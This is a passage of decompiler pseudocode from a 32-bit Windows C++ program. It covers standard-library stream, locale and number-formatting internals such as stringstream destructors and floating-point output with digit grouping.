  *(_DWORD *)(this + 60) = 0;
  *(_DWORD *)(this + 64) = 15;
  *(_BYTE *)(this + 44) = 0;
  *(_WORD *)(this + 68) = 0;
  return this;
}

//----- (0042A740) --------------------------------------------------------
char *__thiscall sub_42A740(char *this, size_t *a2, int a3, size_t *a4)
{
  _DWORD *v5; // eax
  size_t *v6; // ecx
  _BYTE *v7; // eax
  size_t *v8; // edx

  *(_DWORD *)this = 0;
  *((_DWORD *)this + 1) = 0;
  v5 = operator new(0x40u);
  *v5 = v5;
  v5[1] = v5;
  v5[2] = v5;
  *((_WORD *)v5 + 6) = 257;
  *(_DWORD *)this = v5;
  *((_DWORD *)this + 7) = 0;
  *((_DWORD *)this + 8) = 15;
  this[12] = 0;
  *((_DWORD *)this + 15) = 0;
  *((_DWORD *)this + 16) = 15;
  this[44] = 0;
  *((_DWORD *)this + 2) = a3;
  if ( this + 12 != (char *)a2 )
  {
    v6 = a2;
    if ( a2[5] >= 0x10 )
      v6 = (size_t *)*a2;
    sub_41EF80((void **)this + 3, v6, a2[4]);
  }
  if ( !*((_DWORD *)this + 7) )
    goto LABEL_9;
  v7 = this + 12;
  if ( *((_DWORD *)this + 8) >= 0x10u )
    v7 = (_BYTE *)*((_DWORD *)this + 3);
  if ( *v7 != 47 )
LABEL_9:
    sub_41ED70(this + 12, 0, "/", 1u);
  *((_DWORD *)this + 9) = 1;
  *((_DWORD *)this + 10) = 0;
  if ( this + 44 != (char *)a4 )
  {
    v8 = a4;
    if ( a4[5] >= 0x10 )
      v8 = (size_t *)*a4;
    sub_41EF80((void **)this + 11, v8, a4[4]);
  }
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0042A8D0) --------------------------------------------------------
void __thiscall sub_42A8D0(_BYTE *this)
{
  bool v2; // zf
  int v3; // ecx
  int v4; // edx
  _DWORD *v5; // eax
  _DWORD *v6; // esi
  int v7; // ecx
  void (__thiscall ***v8)(_DWORD, int); // eax

  v2 = (this[60] & 1) == 0;
  *(_DWORD *)this = &std::stringbuf::`vftable';
  if ( !v2 )
  {
    v3 = **((_DWORD **)this + 8);
    if ( v3 )
      v4 = v3 + **((_DWORD **)this + 12);
    else
      v4 = **((_DWORD **)this + 7) + **((_DWORD **)this + 11);
    v5 = (_DWORD *)**((_DWORD **)this + 3);
    if ( (unsigned int)(v4 - (_DWORD)v5) >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_46C87D(v5);
  }
  **((_DWORD **)this + 3) = 0;
  **((_DWORD **)this + 7) = 0;
  **((_DWORD **)this + 11) = 0;
  **((_DWORD **)this + 4) = 0;
  **((_DWORD **)this + 8) = 0;
  **((_DWORD **)this + 12) = 0;
  *((_DWORD *)this + 15) &= ~1u;
  *((_DWORD *)this + 14) = 0;
  *(_DWORD *)this = &std::streambuf::`vftable';
  v6 = (_DWORD *)*((_DWORD *)this + 13);
  if ( v6 )
  {
    v7 = v6[1];
    if ( v7 )
    {
      v8 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v7 + 8))(v7);
      if ( v8 )
        (**v8)(v8, 1);
    }
    sub_46C87D(v6);
  }
}
// 4B8584: using guessed type void *std::streambuf::`vftable';
// 4B85C4: using guessed type void *std::stringbuf::`vftable';

//----- (0042A9A0) --------------------------------------------------------
int *__thiscall sub_42A9A0(int *this, int a2)
{
  char v3; // bl
  int v4; // edx
  int v5; // ecx
  int v6; // ecx
  int v7; // eax
  int *v8; // ecx
  int v9; // ecx
  int v10; // eax
  int v11; // ebx
  unsigned int v12; // ecx
  _DWORD *v13; // esi
  int v14; // eax
  const char *v15; // eax
  char v16; // al
  void (__thiscall ***v17)(_DWORD, int); // eax
  int v18; // eax
  int v19; // edx
  int v20; // edx
  int v21; // eax
  _DWORD *v22; // edx
  char v23; // al
  char v24; // cl
  int v25; // eax
  int v26; // ecx
  int v27; // eax
  int v28; // eax
  int v29; // ecx
  char *v31; // esi
  int *v32; // eax
  int v33; // [esp+0h] [ebp-98h] BYREF
  char v34[52]; // [esp+10h] [ebp-88h] BYREF
  _DWORD pExceptionObject[5]; // [esp+44h] [ebp-54h] BYREF
  _DWORD v36[3]; // [esp+58h] [ebp-40h] BYREF
  bool v37; // [esp+64h] [ebp-34h]
  int v38; // [esp+68h] [ebp-30h]
  char v39[4]; // [esp+6Ch] [ebp-2Ch] BYREF
  char v40[4]; // [esp+70h] [ebp-28h] BYREF
  _DWORD *v41; // [esp+74h] [ebp-24h]
  int v42; // [esp+78h] [ebp-20h]
  _DWORD *v43; // [esp+7Ch] [ebp-1Ch]
  int *v44; // [esp+80h] [ebp-18h]
  int v45[2]; // [esp+84h] [ebp-14h] BYREF
  int v46; // [esp+94h] [ebp-4h]

  v45[1] = (int)&v33;
  v44 = this;
  v41 = 0;
  v3 = 0;
  v4 = *this;
  v38 = 0;
  v36[2] = this;
  v5 = *(int *)((char *)this + *(_DWORD *)(v4 + 4) + 56);
  if ( v5 )
  {
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
    v4 = *this;
  }
  v6 = *(_DWORD *)(v4 + 4);
  v7 = v4;
  v46 = 0;
  if ( !*(int *)((char *)this + v6 + 12) )
  {
    v8 = *(int **)((char *)this + v6 + 60);
    if ( v8 )
    {
      if ( v8 != this )
      {
        sub_4212B0(v8);
        v7 = *this;
      }
    }
  }
  v9 = *(_DWORD *)(v7 + 4);
  v10 = *(int *)((char *)this + v9 + 12);
  v37 = v10 == 0;
  v46 = 1;
  if ( !v10 )
  {
    v11 = *(_DWORD *)(*(int *)((char *)this + v9 + 48) + 4);
    v36[1] = v11;
    (*(void (__thiscall **)(int))(*(_DWORD *)v11 + 4))(v11);
    LOBYTE(v46) = 2;
    std::_Lockit::_Lockit((std::_Lockit *)v39, 0);
    v12 = dword_4EEDA4;
    LOBYTE(v46) = 3;
    v43 = (_DWORD *)dword_4EEDAC;
    v45[0] = dword_4EEDA4;
    if ( !dword_4EEDA4 )
    {
      std::_Lockit::_Lockit((std::_Lockit *)v45, 0);
      if ( !dword_4EEDA4 )
        dword_4EEDA4 = ++dword_4F0338;
      std::_Lockit::~_Lockit((std::_Lockit *)v45);
      v12 = dword_4EEDA4;
      v45[0] = dword_4EEDA4;
    }
    if ( v12 >= *(_DWORD *)(v11 + 12) )
    {
      v13 = 0;
    }
    else
    {
      v13 = *(_DWORD **)(*(_DWORD *)(v11 + 8) + 4 * v12);
      if ( v13 )
        goto LABEL_30;
    }
    if ( *(_BYTE *)(v11 + 20) )
    {
      v14 = sub_469E47();
      if ( v45[0] >= *(_DWORD *)(v14 + 12) )
        goto LABEL_20;
      v13 = *(_DWORD **)(*(_DWORD *)(v14 + 8) + 4 * v45[0]);
    }
    if ( !v13 )
    {
LABEL_20:
      if ( v43 )
      {
        v13 = v43;
      }
      else
      {
        v13 = operator new(8u);
        v43 = v13;
        LOBYTE(v46) = 4;
        if ( v13 )
        {
          v15 = *(const char **)(v11 + 24);
          if ( !v15 )
            v15 = (const char *)(v11 + 28);
          sub_401AF0((int)v34, v15);
          v16 = 1;
          v13[1] = 0;
          *v13 = &std::num_put<char,std::ostreambuf_iterator<char>>::`vftable';
        }
        else
        {
          v16 = (char)v41;
          v13 = 0;
        }
        if ( (v16 & 1) != 0 )
          sub_401BC0((int)v34);
        v41 = v13;
        LOBYTE(v46) = 5;
        std::_Facet_Register((struct std::_Facet_base *)v13);
        (*(void (__thiscall **)(_DWORD *))(*v13 + 4))(v13);
        dword_4EEDAC = (int)v13;
      }
    }
LABEL_30:
    std::_Lockit::~_Lockit((std::_Lockit *)v39);
    v17 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v11 + 8))(v11);
    if ( v17 )
      (**v17)(v17, 1);
    v18 = *this;
    LOBYTE(v42) = 0;
    LOBYTE(v46) = 6;
    v19 = *(_DWORD *)(v18 + 4);
    LOBYTE(v41) = *((_BYTE *)this + v19 + 64);
    (*(void (__thiscall **)(_DWORD *, char *, int, _DWORD, _BYTE *, _DWORD *, int))(*v13 + 32))(
      v13,
      v40,
      v42,
      *(int *)((char *)this + v19 + 56),
      (_BYTE *)this + v19,
      v41,
      a2);
    v3 = 0;
    if ( v40[0] )
      v3 = 4;
    v46 = 1;
  }
  v20 = *(_DWORD *)(*this + 4);
  v21 = *(int *)((char *)this + v20 + 12);
  v22 = (int *)((char *)this + v20);
  v23 = v3 | v21;
  v24 = v23 | 4;
  if ( v22[14] )
    v24 = v23;
  v25 = v22[4];
  v26 = v24 & 0x17;
  v22[3] = v26;
  v27 = v26 & v25;
  if ( v27 )
  {
    if ( (v27 & 4) != 0 )
    {
      v31 = "ios_base::badbit set";
    }
    else
    {
      v31 = "ios_base::failbit set";
      if ( (v27 & 2) == 0 )
        v31 = "ios_base::eofbit set";
    }
    v32 = sub_402C50(v36, 1);
    sub_403590(pExceptionObject, v31, v32);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v46 = 8;
  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_421050(this);
  v28 = *this;
  LOBYTE(v46) = 9;
  v29 = *(int *)((char *)this + *(_DWORD *)(v28 + 4) + 56);
  if ( v29 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v29 + 8))(v29);
  return this;
}
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 46A06B: using guessed type int j____uncaught_exception(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8750: using guessed type void *std::num_put<char,std::ostreambuf_iterator<char>>::`vftable';
// 4EEDA4: using guessed type int dword_4EEDA4;
// 4EEDAC: using guessed type int dword_4EEDAC;
// 4F0338: using guessed type int dword_4F0338;
// 42A9A0: using guessed type char var_2C[4];
// 42A9A0: using guessed type char var_28[4];
// 42A9A0: using guessed type _DWORD pExceptionObject[5];

//----- (0042AC80) --------------------------------------------------------
int *__thiscall sub_42AC80(int *this, int *a2)
{
  int *v2; // edi
  int *v3; // esi
  int v4; // edx
  int v5; // ecx
  int **v7; // eax
  int *v8; // edx

  v2 = a2;
  v3 = sub_429F50(this, a2);
  a2 = (int *)*this;
  if ( v3 != a2 )
  {
    v4 = (int)(v3 + 4);
    if ( (unsigned int)v3[9] >= 0x10 )
      v4 = v3[4];
    v5 = (int)v2;
    if ( (unsigned int)v2[5] >= 0x10 )
      v5 = *v2;
    if ( sub_429FB0(v5, v2[4], v4, v3[8]) >= 0 )
      return v3 + 10;
  }
  v7 = (int **)operator new(0x40u);
  v8 = a2;
  v7[8] = 0;
  v7[9] = 0;
  *((_OWORD *)v7 + 1) = *(_OWORD *)v2;
  *((_QWORD *)v7 + 4) = *((_QWORD *)v2 + 2);
  v2[4] = 0;
  v2[5] = 15;
  *(_BYTE *)v2 = 0;
  v7[14] = 0;
  v7[15] = (int *)15;
  *((_BYTE *)v7 + 40) = 0;
  *v7 = v8;
  v7[1] = v8;
  v7[2] = v8;
  *((_WORD *)v7 + 6) = 0;
  sub_429B40(this, &a2, v3, (int *)v7 + 4, v7);
  return a2 + 10;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0042ADB0) --------------------------------------------------------
char __thiscall sub_42ADB0(_BYTE *this)
{
  _DWORD **v2; // ecx
  unsigned __int8 *v3; // edx
  int v4; // eax

  if ( this[4] )
    goto LABEL_10;
  v2 = *(_DWORD ***)this;
  if ( !*(_DWORD *)this
    || ((v3 = (unsigned __int8 *)*v2[7]) == 0 || (int)*v2[11] <= 0
      ? (v4 = ((int (__thiscall *)(_DWORD **))(*v2)[6])(v2))
      : (v4 = *v3),
        v4 == -1) )
  {
    *(_DWORD *)this = 0;
    this[4] = 1;
LABEL_10:
    LOBYTE(v4) = this[5];
    return v4;
  }
  this[5] = v4;
  this[4] = 1;
  return v4;
}

//----- (0042AE00) --------------------------------------------------------
_BYTE *__thiscall sub_42AE00(_BYTE *this)
{
  _DWORD **v2; // ecx
  int *v3; // edx
  unsigned __int8 **v4; // ecx
  unsigned __int8 *v5; // edx
  int v6; // eax

  v2 = *(_DWORD ***)this;
  if ( !v2
    || (!*v2[7] || (v3 = v2[11], *v3 <= 0)
      ? (v6 = ((int (__thiscall *)(_DWORD **))(*v2)[7])(v2))
      : (--*v3, v4 = (unsigned __int8 **)v2[7], v5 = *v4, ++*v4, v6 = *v5),
        v6 == -1) )
  {
    *(_DWORD *)this = 0;
    this[4] = 1;
    return this;
  }
  else
  {
    this[4] = 0;
    return this;
  }
}

//----- (0042AE50) --------------------------------------------------------
int **__thiscall sub_42AE50(int **this)
{
  int *v2; // edx
  int *v4; // ecx
  int *v5; // eax
  int *v6; // ecx
  int *v7; // edi
  int *v8; // ebx
  int *i; // eax

  v2 = *this;
  if ( *((_BYTE *)*this + 13) )
  {
    *this = (int *)v2[2];
    return this;
  }
  v4 = (int *)*v2;
  if ( *(_BYTE *)(*v2 + 13) )
  {
    v5 = (int *)v2[1];
    if ( !*((_BYTE *)v5 + 13) )
    {
      v6 = v2;
      v7 = v2;
      do
      {
        v8 = v5;
        v2 = v7;
        if ( v6 != (int *)*v5 )
          break;
        *this = v5;
        v6 = v5;
        v5 = (int *)v5[1];
        v7 = v6;
        v2 = v8;
      }
      while ( !*((_BYTE *)v5 + 13) );
    }
    if ( !*((_BYTE *)v2 + 13) )
    {
      *this = v5;
      return this;
    }
  }
  else
  {
    for ( i = (int *)v4[2]; !*((_BYTE *)i + 13); i = (int *)i[2] )
      v4 = i;
    *this = v4;
  }
  return this;
}

//----- (0042AEE0) --------------------------------------------------------
unsigned int __stdcall sub_42AEE0(int *a1, int *a2)
{
  int v2; // edx
  int v3; // esi

  v2 = (int)a2;
  if ( (unsigned int)a2[5] >= 0x10 )
    v2 = *a2;
  v3 = (int)a1;
  if ( (unsigned int)a1[5] >= 0x10 )
    v3 = *a1;
  return (unsigned int)sub_429FB0(v3, a1[4], v2, a2[4]) >> 31;
}

//----- (0042AF20) --------------------------------------------------------
void __thiscall sub_42AF20(_BYTE *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 96);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 96) = &std::istringstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 100) = *(_DWORD *)(*(_DWORD *)this + 4) - 96;
  sub_42A8D0(this + 16);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 24) + 4) - 96) = &std::istream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 24) + 4) - 100) = *(_DWORD *)(*((_DWORD *)v1 - 24) + 4) - 24;
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8640: using guessed type void *std::istream::`vftable';
// 4B8648: using guessed type void *std::istringstream::`vftable';

//----- (0042AFB0) --------------------------------------------------------
void __thiscall sub_42AFB0(_BYTE *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 80);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 80) = &std::ostringstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 84) = *(_DWORD *)(*(_DWORD *)this + 4) - 80;
  sub_42A8D0(this + 4);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 20) + 4) - 80) = &std::ostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 20) + 4) - 84) = *(_DWORD *)(*((_DWORD *)v1 - 20) + 4) - 8;
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';
// 4B8604: using guessed type void *std::ostringstream::`vftable';

//----- (0042B039) --------------------------------------------------------
_BYTE *__thiscall sub_42B039(_DWORD *this, char a2)
{
  _BYTE *v2; // esi

  v2 = (char *)this - *(this - 1) - 96;
  sub_42AF20(v2);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}

//----- (0042B080) --------------------------------------------------------
char *__thiscall sub_42B080(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 80;
  sub_42AFB0(this - 80);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}

//----- (0042B0B0) --------------------------------------------------------
_BYTE *__thiscall sub_42B0B0(_BYTE *this, char a2)
{
  sub_42A8D0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0042B0E0) --------------------------------------------------------
_DWORD *__thiscall sub_42B0E0(_DWORD *this, char a2)
{
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';

//----- (0042B110) --------------------------------------------------------
void *__thiscall sub_42B110(void *this, char a2)
{
  void *v4; // [esp-4h] [ebp-8h]

  v4 = (void *)*((_DWORD *)this + 2);
  *(_DWORD *)this = &std::numpunct<char>::`vftable';
  j___free_base(v4);
  j___free_base(*((void **)this + 4));
  j___free_base(*((void **)this + 5));
  *(_DWORD *)this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8780: using guessed type void *std::numpunct<char>::`vftable';

//----- (0042B160) --------------------------------------------------------
void __stdcall sub_42B160(_DWORD *a1)
{
  sub_425620(a1 + 4);
  sub_46C87D(a1);
}

//----- (0042B180) --------------------------------------------------------
_BYTE *__cdecl sub_42B180(int a1, _BYTE *a2, char a3, __int16 a4)
{
  _BYTE *v4; // eax
  _BYTE *v5; // eax
  int v6; // ecx

  *a2 = 37;
  v4 = a2 + 1;
  if ( (a4 & 0x20) != 0 )
  {
    *v4 = 43;
    v4 = a2 + 2;
  }
  if ( (a4 & 0x10) != 0 )
    *v4++ = 35;
  *(_WORD *)v4 = 10798;
  v5 = v4 + 2;
  if ( a3 )
    *v5++ = a3;
  v6 = a4 & 0x3000;
  if ( (a4 & 4) != 0 )
  {
    if ( v6 != 0x2000 )
    {
      if ( v6 == 12288 )
        *v5 = 65;
      else
        *v5 = 2 * (v6 != 4096) + 69;
      v5[1] = 0;
      return a2;
    }
LABEL_14:
    *v5 = 102;
    v5[1] = 0;
    return a2;
  }
  if ( v6 == 0x2000 )
    goto LABEL_14;
  if ( v6 == 12288 )
    *v5 = 97;
  else
    *v5 = 2 * (v6 != 4096) + 101;
  v5[1] = 0;
  return a2;
}

//----- (0042B240) --------------------------------------------------------
_DWORD *__cdecl sub_42B240(
        int a1,
        _DWORD *a2,
        int a3,
        _DWORD *a4,
        __int64 *a5,
        unsigned __int8 a6,
        char *Str,
        size_t a8)
{
  BOOL v8; // ecx
  int v9; // eax
  const char *v10; // edx
  int v11; // eax
  char v12; // cl
  unsigned int v13; // ebx
  void (__thiscall ***v14)(_DWORD, int); // eax
  void **v15; // eax
  struct std::_Facet_base *v16; // eax
  struct std::_Facet_base *v17; // edi
  void (__thiscall ***v18)(_DWORD, int); // eax
  int v19; // eax
  bool v20; // zf
  char v21; // cl
  void **v22; // eax
  char *v23; // eax
  char v24; // al
  int v25; // edx
  unsigned int v26; // edi
  unsigned int v27; // ecx
  void **v28; // esi
  _BYTE *v29; // esi
  unsigned int v30; // esi
  unsigned int v31; // edx
  size_t v32; // esi
  size_t v33; // eax
  void *v34; // eax
  _DWORD *v35; // esi
  _DWORD *v36; // eax
  size_t v37; // edi
  _DWORD *v38; // edi
  char *v39; // ecx
  unsigned int v40; // ebx
  unsigned int v41; // esi
  int v42; // esi
  int v43; // eax
  int *v44; // eax
  int v45; // edx
  _DWORD *v46; // ecx
  unsigned __int8 *v47; // eax
  int *v48; // eax
  unsigned __int8 *v49; // eax
  int *v50; // eax
  unsigned __int8 *v51; // eax
  int v52; // edx
  _DWORD *v53; // ecx
  void **v54; // eax
  int *v55; // eax
  void *v56; // ecx
  void *v57; // ecx
  int v59; // [esp-28h] [ebp-A0h]
  size_t v60; // [esp-10h] [ebp-88h]
  size_t v61; // [esp+14h] [ebp-64h]
  char *v62; // [esp+14h] [ebp-64h]
  char *v63; // [esp+1Ch] [ebp-5Ch]
  unsigned int v64; // [esp+1Ch] [ebp-5Ch]
  char Control[2]; // [esp+20h] [ebp-58h] BYREF
  int v66; // [esp+24h] [ebp-54h] BYREF
  size_t Size; // [esp+28h] [ebp-50h]
  size_t v68; // [esp+2Ch] [ebp-4Ch]
  int v69; // [esp+30h] [ebp-48h]
  char v70; // [esp+37h] [ebp-41h]
  int v71[5]; // [esp+38h] [ebp-40h] BYREF
  unsigned int v72; // [esp+4Ch] [ebp-2Ch]
  void *Src[4]; // [esp+50h] [ebp-28h] BYREF
  unsigned int v74; // [esp+60h] [ebp-18h]
  unsigned int v75; // [esp+64h] [ebp-14h]
  int v76; // [esp+74h] [ebp-4h]
  int savedregs; // [esp+78h] [ebp+0h] BYREF
  _DWORD *v78; // [esp+8Ch] [ebp+14h]

  v8 = a8 && (*Str == 43 || *Str == 45);
  v9 = *((_DWORD *)a5 + 5) & 0x3000;
  v69 = v8;
  if ( v9 == 12288 )
  {
    v11 = v8 + 2;
    v10 = "pP";
    if ( v8 + 2 <= a8 && Str[v8] == 48 )
    {
      v12 = Str[v8 + 1];
      if ( v12 == 120 || v12 == 88 )
        v69 = v11;
    }
  }
  else
  {
    v10 = "eE";
  }
  v68 = strcspn(Str, v10);
  strcpy(Control, ".");
  Control[0] = *localeconv()->decimal_point;
  v13 = strcspn(Str, Control);
  v61 = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
  Size = v61;
  (*(void (**)(void))(*(_DWORD *)v61 + 4))();
  v76 = 0;
  v63 = sub_421800((int)&savedregs, (int)&v66);
  v76 = -1;
  if ( v61 )
  {
    v14 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(size_t))(*(_DWORD *)v61 + 8))(v61);
    if ( v14 )
      (**v14)(v14, 1);
  }
  sub_419B50((int)Src, a8, 0);
  v15 = Src;
  if ( v75 >= 0x10 )
    v15 = (void **)Src[0];
  v76 = 1;
  (*(void (__stdcall **)(char *, char *, void **))(*(_DWORD *)v63 + 28))(Str, &Str[a8], v15);
  Size = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
  (*(void (**)(void))(*(_DWORD *)Size + 4))();
  LOBYTE(v76) = 2;
  v16 = sub_42A3A0((int)&v66);
  LOBYTE(v76) = 1;
  v17 = v16;
  if ( Size )
  {
    v18 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(size_t))(*(_DWORD *)Size + 8))(Size);
    if ( v18 )
      (**v18)(v18, 1);
  }
  (*(void (__thiscall **)(struct std::_Facet_base *, int *))(*(_DWORD *)v17 + 20))(v17, v71);
  v19 = *(_DWORD *)v17;
  LOBYTE(v76) = 3;
  v70 = (*(int (__thiscall **)(struct std::_Facet_base *))(v19 + 16))(v17);
  v20 = v13 == a8;
  if ( v13 != a8 )
  {
    v21 = (*(int (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v17 + 12))(v17);
    v22 = Src;
    if ( v75 >= 0x10 )
      v22 = (void **)Src[0];
    v20 = v13 == a8;
    *((_BYTE *)v22 + v13) = v21;
  }
  if ( v20 )
    v13 = v68;
  v23 = (char *)v71;
  if ( v72 >= 0x10 )
    v23 = (char *)v71[0];
  v62 = v23;
  v24 = *v23;
  if ( v24 == 127 )
  {
LABEL_62:
    v25 = v69;
  }
  else
  {
    while ( 1 )
    {
      v25 = v69;
      if ( v24 <= 0 || v24 >= v13 - v69 )
        break;
      v26 = v74;
      v13 -= v24;
      if ( v74 < v13 )
        sub_421040();
      v27 = v75;
      v64 = v75;
      if ( v75 == v74 )
      {
        if ( v74 == 0x7FFFFFFF )
          sub_4257D0();
        v30 = (v74 + 1) | 0xF;
        if ( v30 <= 0x7FFFFFFF )
        {
          v31 = v75 >> 1;
          if ( v75 <= 0x7FFFFFFF - (v75 >> 1) )
          {
            if ( v30 < v75 + v31 )
              v30 = v75 + v31;
          }
          else
          {
            v30 = 0x7FFFFFFF;
          }
        }
        else
        {
          v30 = 0x7FFFFFFF;
        }
        v68 = v30;
        v32 = v30 + 1;
        if ( v32 < 0x1000 )
        {
          if ( v32 )
          {
            v36 = operator new(v32);
            v27 = v64;
            v35 = v36;
          }
          else
          {
            v35 = 0;
          }
        }
        else
        {
          v33 = v32 + 35;
          if ( v32 + 35 <= v32 )
            v33 = -1;
          v34 = operator new(v33);
          if ( !v34 )
            goto LABEL_91;
          v27 = v64;
          v35 = (_DWORD *)(((unsigned int)v34 + 35) & 0xFFFFFFE0);
          *(v35 - 1) = v34;
        }
        v74 = v26 + 1;
        v37 = v26 - v13 + 1;
        v75 = v68;
        v68 = v70;
        Size = v37;
        if ( v27 < 0x10 )
        {
          memmove(v35, Src, v13);
          *((_BYTE *)v35 + v13) = v68;
          memmove((char *)v35 + v13 + 1, (char *)Src + v13, v37);
        }
        else
        {
          v38 = Src[0];
          memmove(v35, Src[0], v13);
          v60 = Size;
          *((_BYTE *)v35 + v13) = v68;
          memmove((char *)v35 + v13 + 1, (char *)v38 + v13, v60);
          if ( v64 + 1 >= 0x1000 )
          {
            if ( (unsigned int)v38 - *(v38 - 1) - 4 > 0x1F )
              goto LABEL_91;
            v38 = (_DWORD *)*(v38 - 1);
          }
          sub_46C87D(v38);
        }
        Src[0] = v35;
      }
      else
      {
        v28 = Src;
        ++v74;
        if ( v75 >= 0x10 )
          v28 = (void **)Src[0];
        v29 = (char *)v28 + v13;
        memmove_0(v29 + 1, v29, v26 - v13 + 1);
        *v29 = v70;
      }
      v39 = v62;
      if ( v62[1] > 0 )
        v39 = v62 + 1;
      v62 = v39;
      v24 = *v39;
      if ( *v39 == 127 )
        goto LABEL_62;
    }
  }
  v40 = v74;
  v41 = *((_DWORD *)a5 + 8);
  if ( a5[4] <= 0 || v41 <= v74 )
    v42 = 0;
  else
    v42 = v41 - v74;
  v43 = *((_DWORD *)a5 + 5) & 0x1C0;
  if ( v43 == 64 )
  {
    v51 = (unsigned __int8 *)Src;
    if ( v75 >= 0x10 )
      v51 = (unsigned __int8 *)Src[0];
    v48 = sub_42DD60(a1, &v66, a3, a4, v51, v25);
  }
  else if ( v43 == 256 )
  {
    v49 = (unsigned __int8 *)Src;
    if ( v75 >= 0x10 )
      v49 = (unsigned __int8 *)Src[0];
    v50 = sub_42DD60(a1, &v66, a3, a4, v49, v25);
    v48 = sub_42DDE0(a1, &v66, *v50, (_DWORD *)v50[1], a6, v42);
    v42 = 0;
  }
  else
  {
    v44 = sub_42DDE0(a1, &v66, a3, a4, a6, v42);
    v42 = 0;
    v45 = *v44;
    v46 = (_DWORD *)v44[1];
    v47 = (unsigned __int8 *)Src;
    if ( v75 >= 0x10 )
      v47 = (unsigned __int8 *)Src[0];
    v48 = sub_42DD60(a1, &v66, v45, v46, v47, v69);
  }
  v52 = *v48;
  v53 = (_DWORD *)v48[1];
  v54 = Src;
  if ( v75 >= 0x10 )
    v54 = (void **)Src[0];
  v55 = sub_42DD60(a1, &v66, v52, v53, (unsigned __int8 *)v54 + v69, v40 - v69);
  v59 = *v55;
  v78 = (_DWORD *)v55[1];
  *((_DWORD *)a5 + 8) = 0;
  *((_DWORD *)a5 + 9) = 0;
  sub_42DDE0(a1, a2, v59, v78, a6, v42);
  if ( v72 >= 0x10 )
  {
    v56 = (void *)v71[0];
    if ( v72 + 1 >= 0x1000 )
    {
      v56 = *(void **)(v71[0] - 4);
      if ( (unsigned int)(v71[0] - (_DWORD)v56 - 4) > 0x1F )
        goto LABEL_91;
    }
    sub_46C87D(v56);
  }
  v71[4] = 0;
  v72 = 15;
  LOBYTE(v71[0]) = 0;
  if ( v75 >= 0x10 )
  {
    v57 = Src[0];
    if ( v75 + 1 < 0x1000 || (v57 = (void *)*((_DWORD *)Src[0] - 1), (unsigned int)(Src[0] - v57 - 4) <= 0x1F) )
    {
      sub_46C87D(v57);
      return a2;
    }
LABEL_91:
    _invalid_parameter_noinfo_noreturn();
  }
  return a2;
}
// 421040: using guessed type void __noreturn sub_421040(void);
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0042B7B0) --------------------------------------------------------
void *__thiscall sub_42B7B0(void *this)
{
  return this;
}

//----- (0042B7C0) --------------------------------------------------------
int __cdecl sub_42B7C0(_DWORD *a1, int a2)
{
  char v2; // bl
  _DWORD *v3; // edi
  int v4; // ecx
  const char *v5; // eax
  _BYTE *v6; // eax
  int v7; // ebx
  const char *v8; // esi
  _BYTE *v9; // eax
  char v10; // cl
  int v11; // ebx
  const char *v12; // esi
  _BYTE *v13; // eax
  char v14; // cl
  _Cvtvec v16; // [esp+10h] [ebp-ACh] BYREF
